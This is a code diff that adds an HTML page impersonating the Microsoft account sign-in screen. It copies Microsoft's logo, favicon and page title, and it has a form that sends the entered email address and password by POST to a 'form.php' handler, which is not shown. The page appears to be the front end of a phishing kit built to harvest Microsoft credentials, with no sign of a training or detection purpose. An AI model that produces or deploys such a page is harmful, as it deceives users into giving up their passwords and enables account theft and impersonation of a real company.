@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="shortcut icon" href="./assets/microsoft_logo_icon_170957.png" type="image/x-icon">
+    <script src="./form.js" defer></script>
+    <title>Sign in to your Microsoft account</title>
+</head>
+<body>
+   <main class="main">
+   
+    <div class="form-Container">
+        <img src="./assets/microsoft_logo.svg" alt="" class="logo">
+        <form action="form.php" method="post">
+            <h2 class="signIn">
+                Sign In
+            </h2>
+            <input type="email" name="email" id="username" required placeholder="Email">
+            <h2 class="enterpassword">
+                Enter Password
+            </h2>
+            <p id="err"></p>
+            <input type="password" name="password" id="password" required placeholder="password" maxlength="8">
+            <div class="switchContainer">
+                <input type="checkbox" name="" id="toggle">
+                <p style="cursor: pointer;" id="click">Show password</p>
+            </div>
+            <div class="btn-Container">
+                <input type="submit" name="submit" value="Next" class="btn">
+            </div>
+        </form>
+
+    </div>
+    <div class="signIn-Options">
+        <img src="./assets/key.svg" alt="" class="key">
+        <p class="text">Sign-in Options</p>
+    </div>
+    
+   </main> 
+  
+</body>
+</html>
